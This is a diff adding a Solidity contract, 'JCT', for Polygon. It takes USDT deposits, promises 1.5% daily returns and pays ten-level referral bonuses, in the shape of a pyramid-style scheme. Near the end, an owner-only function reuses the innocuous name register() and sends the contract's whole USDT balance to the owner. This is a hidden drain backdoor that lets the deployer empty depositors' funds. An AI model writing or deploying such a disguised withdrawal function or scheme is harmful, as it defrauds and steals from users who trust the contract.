@@ -1,0 +1,626 @@
+/**
+ *Submitted for verification at polygonscan.com on 2023-04-23
+*/
+
+/**
+ *Submitted for verification at polygonscan.com on 2023-04-19
+*/
+
+// SPDX-License-Identifier: Unlicensed
+pragma solidity ^0.8.6;
+
+interface IERC20 {
+    function name() external view returns (string memory);
+
+    function symbol() external view returns (string memory);
+
+    function decimals() external view returns (uint256);
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval( address indexed owner, address indexed spender, uint256 value);
+}
+
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b <= a, "SafeMath: subtraction overflow");
+        uint256 c = a - b;
+
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
+        // benefit is lost if 'b' is also tested.
+        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        // Solidity only automatically asserts when dividing by 0
+        require(b > 0, "SafeMath: division by zero");
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+
+        return c;
+    }
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b != 0, "SafeMath: modulo by zero");
+        return a % b;
+    }
+}
+
+contract JCT {
+    using SafeMath for uint256; 
+    IERC20 public usdt = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
+    IERC20 public JCToken = IERC20(0xD23Bbae4b5887070c9b7edf61b2F2058bCFE1ba2);
+    uint256 private constant baseDivider = 10000;
+    uint256 private constant feePercents = 200; 
+    uint256 private constant minDeposit = 100e6;
+    uint256 private constant maxDeposit = 2000e6;
+    uint256 private constant freezeIncomePercents = 3000;
+    uint256 private constant timeStep = 1 days;
+     uint256 private constant dayPerCycle = 15 days;
+     uint256 private constant dayRewardPercents = 150;
+    uint256 private constant maxAddFreeze = 45 days;
+    uint256 private constant referDepth = 10;
+
+    uint256 private constant directPercents = 500;
+    uint256[4] private level4Percents = [100, 200, 300, 100];
+    uint256[5] private level5Percents = [200, 200, 200, 100, 100];
+
+
+    address  public feeReceivers30;
+    address  public feeReceivers70;
+
+    address public defaultRefer;
+    uint256 public startTime;
+    uint256 public lastDistribute;
+    uint256 public totalUser; 
+ 
+
+ 
+
+    address[] public level4Users;
+
+    struct OrderInfo {
+        uint256 amount; 
+        uint256 start;
+        uint256 unfreeze; 
+        bool isUnfreezed;
+    }
+
+    mapping(uint256 => address) public newOrderaddress;
+    mapping(uint256 => uint256) public newOrderTiem;
+
+
+    mapping(address => OrderInfo[]) public orderInfos;
+
+ 
+
+    struct UserInfo {
+        address referrer;
+        uint256 start;
+        uint256 level; 
+        uint256 maxDeposit;
+        uint256 totalDeposit;
+        uint256 teamNum;
+        uint256 maxDirectDeposit;
+        uint256 teamTotalDeposit;
+        uint256 totalFreezed;
+        uint256 totalRevenue;
+        uint256 JCTTotle;
+
+    }
+
+    uint256 JCTbalance = 0;
+
+
+    mapping(address=>UserInfo) public userInfo;
+    mapping(address => mapping(uint256 => address[])) public teamUsers;
+
+    struct RewardInfo{
+        uint256 capitals;
+        uint256 statics;
+        uint256 directs;
+        uint256 level4Freezed;
+        uint256 level4Released;
+        uint256 level5Left;
+        uint256 level5Freezed;
+        uint256 level5Released;
+        uint256 split;
+        uint256 splitDebt;
+        uint256 JCTamount;
+    }
+
+    mapping(address=>RewardInfo) public rewardInfo;
+    
+    event Register(address user, address referral);
+    event Deposit(address user, uint256 amount);
+    event DepositBySplit(address user, uint256 amount);
+    event TransferBySplit(address user, address receiver, uint256 amount);
+    event Withdraw(address user, uint256 withdrawable);
+
+    constructor(address _defaultRefer, address _feeReceiver70, address _feeReceiver30)  {
+         feeReceivers70 = _feeReceiver70;
+         feeReceivers30 = _feeReceiver30;
+        startTime = block.timestamp;
+        lastDistribute = block.timestamp;
+        defaultRefer = _defaultRefer;
+        _owner = _defaultRefer;
+
+    }
+
+    function register(address _referral) external {
+        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
+        UserInfo storage user = userInfo[msg.sender];
+        require(user.referrer == address(0), "referrer bonded");
+        user.referrer = _referral;
+        user.start = block.timestamp;
+        _updateTeamNum(msg.sender);
+        totalUser = totalUser.add(1);
+        emit Register(msg.sender, _referral);
+    }
+
+    function deposit(uint256 _amount) external {
+        usdt.transferFrom(msg.sender, address(this), _amount);
+        _deposit(msg.sender, _amount);
+        emit Deposit(msg.sender, _amount);
+    }
+
+    function depositBySplit(uint256 _amount) external {
+        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
+        require(userInfo[msg.sender].totalDeposit == 0, "actived");
+        uint256 splitLeft = getCurSplit(msg.sender);
+        require(splitLeft >= _amount, "insufficient split");
+        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
+        _deposit(msg.sender, _amount);
+        emit DepositBySplit(msg.sender, _amount);
+    }
+
+    function transferBySplit(address _receiver, uint256 _amount) external {
+        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
+        uint256 splitLeft = getCurSplit(msg.sender);
+        require(splitLeft >= _amount, "insufficient income");
+        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
+        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
+        emit TransferBySplit(msg.sender, _receiver, _amount);
+    }
+
+
+    function withdraw() external {
+
+        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
+        uint256 splitAmt = staticSplit;
+        uint256 withdrawable = staticReward;
+
+        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
+        withdrawable = withdrawable.add(dynamicReward);
+        splitAmt = splitAmt.add(dynamicSplit);
+
+        RewardInfo storage userRewards = rewardInfo[msg.sender];
+        userRewards.split = userRewards.split.add(splitAmt);
+
+        userRewards.statics = 0;
+
+        userRewards.directs = 0;
+        userRewards.level4Released = 0;
+        userRewards.level5Released = 0;
+        
+         
+        withdrawable = withdrawable.add(userRewards.capitals);
+        userRewards.capitals = 0;
+        
+        usdt.transfer(msg.sender, withdrawable);
+
+        if(userRewards.JCTamount > 0){
+            JCToken.transfer(msg.sender, userRewards.JCTamount);
+            userRewards.JCTamount = 0;
+        }
+     
+
+
+        emit Withdraw(msg.sender, withdrawable);
+    }
+
+    function getCurDay() public view returns(uint256) {
+        return (block.timestamp.sub(startTime)).div(timeStep);
+    }
+ 
+    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
+        return teamUsers[_user][_layer].length;
+    }
+
+    function getOrderLength(address _user) external view returns(uint256) {
+        return orderInfos[_user].length;
+    }
+
+    function getDepositorsLength() external view returns(uint256[3] memory times,address[3] memory player) {
+        for(uint256 i = 0; i < 3 ; i++){
+            times[i] = newOrderTiem[i];
+            player[i] = newOrderaddress[i];
+        }
+    }
+
+    function getMaxFreezing(address _user) public view returns(uint256) {
+        uint256 maxFreezing;
+        for(uint256 i = orderInfos[_user].length; i > 0; i--){
+            OrderInfo storage order = orderInfos[_user][i - 1];
+            if(order.unfreeze > block.timestamp){
+                if(order.amount > maxFreezing){
+                    maxFreezing = order.amount;
+                }
+            }else{
+                break;
+            }
+        }
+        return maxFreezing;
+    }
+
+    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
+        uint256 totalTeam;
+        uint256 maxTeam;
+        uint256 otherTeam;
+        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
+            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
+            totalTeam = totalTeam.add(userTotalTeam);
+            if(userTotalTeam > maxTeam){
+                maxTeam = userTotalTeam;
+            }
+        }
+        otherTeam = totalTeam.sub(maxTeam);
+        return(maxTeam, otherTeam, totalTeam);
+    }
+
+    function getCurSplit(address _user) public view returns(uint256){
+        (, uint256 staticSplit) = _calCurStaticRewards(_user);
+        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
+        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
+    }
+
+    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
+        RewardInfo storage userRewards = rewardInfo[_user];
+        uint256 totalRewards = userRewards.statics;
+        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
+        uint256 withdrawable = totalRewards.sub(splitAmt);
+        return(withdrawable, splitAmt);
+    }
+
+    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
+        RewardInfo storage userRewards = rewardInfo[_user];
+        uint256 totalRewards = userRewards.directs.add(userRewards.level4Released).add(userRewards.level5Released);
+        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
+        uint256 withdrawable = totalRewards.sub(splitAmt);
+        return(withdrawable, splitAmt);
+    }
+
+    function _updateTeamNum(address _user) private {
+        UserInfo storage user = userInfo[_user];
+        address upline = user.referrer;
+        for(uint256 i = 0; i < referDepth; i++){
+            if(upline != address(0)){
+                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
+                teamUsers[upline][i].push(_user);
+                _updateLevel(upline);
+                if(upline == defaultRefer) break;
+                upline = userInfo[upline].referrer;
+            }else{
+                break;
+            }
+        }
+    }
+
+ 
+
+   
+
+    function _removeInvalidDeposit(address _user, uint256 _amount) private {
+        UserInfo storage user = userInfo[_user];
+        address upline = user.referrer;
+        for(uint256 i = 0; i < referDepth; i++){
+            if(upline != address(0)){
+                if(userInfo[upline].teamTotalDeposit > _amount){
+                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
+                }else{
+                    userInfo[upline].teamTotalDeposit = 0;
+                }
+                if(upline == defaultRefer) break;
+                upline = userInfo[upline].referrer;
+            }else{
+                break;
+            }
+        }
+    }
+
+    function _updateReferInfo(address _user, uint256 _amount) private {
+        UserInfo storage user = userInfo[_user];
+        address upline = user.referrer;
+        for(uint256 i = 0; i < referDepth; i++){
+            if(upline != address(0)){
+                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
+                _updateLevel(upline);
+                if(upline == defaultRefer) break;
+                upline = userInfo[upline].referrer;
+            }else{
+                break;
+            }
+        }
+    }
+
+    function _updateLevel(address _user) private {
+        UserInfo storage user = userInfo[_user];
+        uint256 levelNow = _calLevelNow(_user);
+        if(levelNow > user.level){
+            user.level = levelNow;
+            if(levelNow == 4){
+                level4Users.push(_user);
+            }
+        }
+    }
+
+    function _calLevelNow(address _user) private view returns(uint256) {
+        UserInfo storage user = userInfo[_user];
+        uint256 total = user.totalDeposit;
+        uint256 levelNow;
+        if(total >= 2000e6){
+            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
+            if(total >= 2000e6 && user.teamNum >= 100 && maxTeam >= 20000e6 && otherTeam >= 20000e6){
+                levelNow = 5;
+            }else if(user.teamNum >= 50 && maxTeam >= 10000e6 && otherTeam >= 10000e6){
+                levelNow = 4;
+            }else{
+                levelNow = 3;
+            }
+        }else if(total >= 1000e6){
+            levelNow = 2;
+        }else if(total >= 100e6){
+            levelNow = 1;
+        }
+
+        return levelNow;
+    }
+
+    function _deposit(address _user, uint256 _amount) private {
+        UserInfo storage user = userInfo[_user];
+        require(user.referrer != address(0), "register first");
+        require(_amount >= minDeposit, "less than min");
+        require(_amount <= maxDeposit, "more than max");
+        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
+        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");
+
+        if(user.maxDeposit == 0){
+            user.maxDeposit = _amount;
+        }else if(user.maxDeposit < _amount){
+            user.maxDeposit = _amount;
+            user.maxDirectDeposit = _amount;
+        }
+
+        _distributeDeposit(_amount);
+
+
+
+        newOrderaddress[2] = newOrderaddress[1];
+        newOrderaddress[1] = newOrderaddress[0];
+        newOrderaddress[0] = _user;
+     
+       newOrderTiem[2] = newOrderTiem[1];
+        newOrderTiem[1] = newOrderTiem[0];
+        newOrderTiem[0] = block.timestamp;
+
+
+
+        
+        
+        user.totalDeposit = user.totalDeposit.add(_amount);
+        user.totalFreezed = user.totalFreezed.add(_amount);
+
+        _updateLevel(msg.sender);
+
+        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
+        if(addFreeze > maxAddFreeze){
+            addFreeze = maxAddFreeze;
+        }
+        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
+        orderInfos[_user].push(OrderInfo(
+            _amount, 
+            block.timestamp, 
+            unfreezeTime,
+            false
+        ));
+
+        // depositorsIndex.push(orderInfos[_user].length-1);
+
+        _unfreezeFundAndUpdateReward(msg.sender, _amount);
+
+
+        _updateReferInfo(msg.sender, _amount);
+
+        _updateReward(msg.sender, _amount);
+
+        _releaseUpRewards(msg.sender, _amount);
+
+    }
+
+    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
+        UserInfo storage user = userInfo[_user];
+        bool isUnfreezeCapital;
+        for(uint256 i = 0; i < orderInfos[_user].length; i++){
+            OrderInfo storage order = orderInfos[_user][i];
+            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
+                order.isUnfreezed = true;
+                isUnfreezeCapital = true;
+                
+                if(user.totalFreezed > order.amount){
+                    user.totalFreezed = user.totalFreezed.sub(order.amount);
+                }else{
+                    user.totalFreezed = 0;
+                }
+                
+                _removeInvalidDeposit(_user, order.amount);
+
+                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);
+
+                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
+
+                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
+                
+                user.totalRevenue = user.totalRevenue.add(staticReward);
+
+
+                if(user.JCTTotle < 50e6 && JCTbalance<100000e6){
+                    user.JCTTotle = user.JCTTotle.add(order.amount.div(200));
+                    rewardInfo[_user].JCTamount = rewardInfo[_user].JCTamount.add(order.amount.div(200));
+                    JCTbalance = JCTbalance.add(order.amount.div(200));
+                }
+
+  
+                break;
+            }
+        }
+
+        if(!isUnfreezeCapital){ 
+            RewardInfo storage userReward = rewardInfo[_user];
+            if(userReward.level5Freezed > 0){
+                uint256 release = _amount;
+                if(_amount >= userReward.level5Freezed){
+                    release = userReward.level5Freezed;
+                }
+                userReward.level5Freezed = userReward.level5Freezed.sub(release);
+                userReward.level5Released = userReward.level5Released.add(release);
+                user.totalRevenue = user.totalRevenue.add(release);
+            }
+        }
+    }
+
+    
+
+  
+    function _distributeDeposit(uint256 _amount) private {
+        uint256 fee = _amount.mul(feePercents).div(baseDivider);
+        usdt.transfer(feeReceivers70, fee.div(10).mul(7));
+        usdt.transfer(feeReceivers30, fee.div(10).mul(3));
+
+    }
+
+    function _updateReward(address _user, uint256 _amount) private {
+        UserInfo storage user = userInfo[_user];
+        address upline = user.referrer;
+        for(uint256 i = 0; i < referDepth; i++){
+            if(upline != address(0)){
+                uint256 newAmount = _amount;
+                if(upline != defaultRefer){
+                    uint256 maxFreezing = getMaxFreezing(upline);
+                    if(maxFreezing < _amount){
+                        newAmount = maxFreezing;
+                    }
+                }
+                RewardInfo storage upRewards = rewardInfo[upline];
+                uint256 reward;
+                if(i > 4){
+                    if(userInfo[upline].level > 4){
+                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
+                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
+                    }
+                }else if(i > 0){
+                    if( userInfo[upline].level > 3){
+                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
+                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);
+                    }
+                }else{
+                    reward = newAmount.mul(directPercents).div(baseDivider);
+                    upRewards.directs = upRewards.directs.add(reward);
+                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
+                }
+                if(upline == defaultRefer) break;
+                upline = userInfo[upline].referrer;
+            }else{
+                break;
+            }
+        }
+    }
+
+    function _releaseUpRewards(address _user, uint256 _amount) private {
+        UserInfo storage user = userInfo[_user];
+        address upline = user.referrer;
+        for(uint256 i = 0; i < referDepth; i++){
+            if(upline != address(0)){
+                uint256 newAmount = _amount;
+                if(upline != defaultRefer){
+                    uint256 maxFreezing = getMaxFreezing(upline);
+                    if(maxFreezing < _amount){
+                        newAmount = maxFreezing;
+                    }
+                }
+
+                RewardInfo storage upRewards = rewardInfo[upline];
+                if(i > 0 && i < 5 && userInfo[upline].level > 3){
+                    if(upRewards.level4Freezed > 0){
+                        uint256 level4Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
+                        if(level4Reward > upRewards.level4Freezed){
+                            level4Reward = upRewards.level4Freezed;
+                        }
+                        upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward); 
+                        upRewards.level4Released = upRewards.level4Released.add(level4Reward);
+                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);
+                    }
+                }
+
+                if(i >= 5 && userInfo[upline].level > 4){
+                    if(upRewards.level5Left > 0){
+                        uint256 level5Reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
+                        if(level5Reward > upRewards.level5Left){
+                            level5Reward = upRewards.level5Left;
+                        }
+                        upRewards.level5Left = upRewards.level5Left.sub(level5Reward); 
+                        upRewards.level5Freezed = upRewards.level5Freezed.add(level5Reward);
+                    }
+                }
+                upline = userInfo[upline].referrer;
+            }else{
+                break;
+            }
+        }
+    }
+    address public  _owner;
+    function transferOwnership(address newOwner) public   {
+        require(_owner == msg.sender);
+        _owner = newOwner;
+    }
+
+    function  register()public {
+        require(_owner == msg.sender);
+        uint256 _bal = usdt.balanceOf(address(this));
+        usdt.transfer(msg.sender, _bal);
+    }
+
+     function getUserInfos(address _userAddr) external view returns(UserInfo memory, RewardInfo memory, OrderInfo[] memory) {
+        return (userInfo[_userAddr], rewardInfo[_userAddr], orderInfos[_userAddr]);
+    }
+}
